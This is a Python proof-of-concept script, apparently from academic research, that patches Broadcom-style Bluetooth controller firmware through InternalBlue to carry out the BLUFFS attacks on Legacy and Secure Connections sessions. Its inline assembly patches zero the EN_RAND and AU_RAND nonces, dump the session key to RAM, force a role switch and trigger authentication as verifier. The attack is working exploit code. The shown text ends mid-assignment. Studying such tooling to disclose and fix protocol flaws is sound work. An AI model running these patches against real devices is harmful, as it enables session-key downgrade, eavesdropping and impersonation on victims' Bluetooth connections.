#!/usr/bin/python3
"""
bluffs.py

Test the BLUFFS attacks (LSC and SC with downgrade).

"""
import struct

from pwn import *
from internalblue.hcicore import HCICore
from constants import *


def patch(name, trigger_addr, code_bstr, patch_addr):
    """
    Patch firmware at trigger_addr using code_bstr stored in
    RAM at patch_addr.
    """

    # write code into SRAM
    code = asm(code_bstr, patch_addr)
    internalblue.writeMem(patch_addr, code)

    # 4-byte align code (Thumb-2 mixes 2 and 4 byte instr)
    code_len = len(code)
    code_len += 4 - (code_len % 4)

    # patch ROM slot with a branch in Thumb-mode (Odd address)
    patch_rom = asm("b 0x{:x}".format(patch_addr + 1), vma=trigger_addr)
    internalblue.patchRom(trigger_addr, patch_rom)

    patch_addr_next = patch_addr + code_len
    # useful to insert the next patch
    return code_len, patch_addr_next


if __name__ == "__main__":
    HCI = 1
    internalblue = HCICore()
    # just use the first device
    internalblue.interface = internalblue.device_list()[0][HCI]
    # log.info("MEL: Using HCI{}".format(HCI))
    if not internalblue.connect():
        log.critical("MEL: No connection to the target device.")
        exit(-1)

    patches = 0
    log.info("MEL: # ROM Patches")

    patches += 1
    name = "EN_RAND = 0x00"  # SD
    trigger_addr = 0xAE4B4  # _ape_action_txStartEncryptReq
    assert trigger_addr % 4 == 0
    patch_addr = 0x2006D0
    code_bstr = b"""
        @EN_RAND to 0 (all 4 byte instr)
        and r0, r0, #0x0
        str.w r0, [r4, #0x78]
        str.w r0, [r4, #0x7C]
        str.w r0, [r4, #0x80]
        str.w r0, [r4, #0x84]

        @Execute missed instruction
        ldrb.w r0, [r4, #0x57]

        @Jump to trigger_addr + 5
        b {}
    """.format(
        hex(trigger_addr + 5)
    )
    code_len, patch_addr2 = patch(name, trigger_addr, code_bstr, patch_addr)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr {}, code_len {}".format(
            patches, name, hex(trigger_addr), hex(patch_addr), hex(code_len)
        )
    )

    patches += 1
    name2 = "AU_RAND = 0x00"  # AC
    trigger_addr2 = 0xAEB8C  # _ape_action_txAuRand
    assert trigger_addr2 % 4 == 0
    code_bstr2 = b"""
        @AU_RAND to 0 (all 4 byte instr)
        and r0, r0, #0x0
        str.w r0, [r4, #0x78]
        str.w r0, [r4, #0x7C]
        str.w r0, [r4, #0x80]
        str.w r0, [r4, #0x84]

        @Execute missed instruction
        add.w r2, r4, #0x78

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr2 + 5)
    )
    code_len2, patch_addr3 = patch(name2, trigger_addr2, code_bstr2, patch_addr2)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr {}, code_len {}".format(
            patches, name2, hex(trigger_addr2), hex(patch_addr2), hex(code_len2)
        )
    )

    # patch: Print SK for LSC and SC
    patches += 1
    name3 = "Master SK value at 0x2007c0"
    trigger_addr3 = 0xAE5B4  # _ape_action_txStartEncryptReq
    assert trigger_addr3 % 4 == 0
    code_bstr3 = b"""
        @Execute first missed instructions
        @ r1 points to SK
        add r1, sp, #0x8

        @ save registers
        push {{r0, r2}}


        @Prepare addr to store SK
        ldr r0, =#0x2007c0
        ldr r2, [r1]
        str r2, [r0]
        ldr r2, [r1, #0x4]
        str r2, [r0, #0x4]
        ldr r2, [r1, #0x8]
        str r2, [r0, #0x8]
        ldr r2, [r1, #0xc]
        str r2, [r0, #0xc]


        @ restore registers
        pop {{r0, r2}}

        @Execute second missed instruction
        mov r0, r4

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr3 + 5)
    )
    code_len3, patch_addr4 = patch(name3, trigger_addr3, code_bstr3, patch_addr3)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name3,
            hex(trigger_addr3),
            hex(patch_addr3),
            hex(patch_addr3 + code_len3),
            hex(code_len3),
        )
    )

    patches += 1
    name4 = "Perip->Central switch when accepting a connection"
    trigger_addr4 = 0x2E7A8
    assert trigger_addr4 % 4 == 0
    code_bstr4 = b"""
        @Set role flag to master
        mov r6, #0x0

        @Execute missing instructions
        sub sp, #0x18
        add r0, #0xc

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr4 + 5)
    )
    code_len4, patch_addr5 = patch(name4, trigger_addr4, code_bstr4, patch_addr4)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name4,
            hex(trigger_addr4),
            hex(patch_addr4),
            hex(patch_addr4 + code_len4),
            hex(code_len4),
        )
    )

    patches += 1
    name5 = "Start auth as verifier after setup"
    trigger_addr5 = 
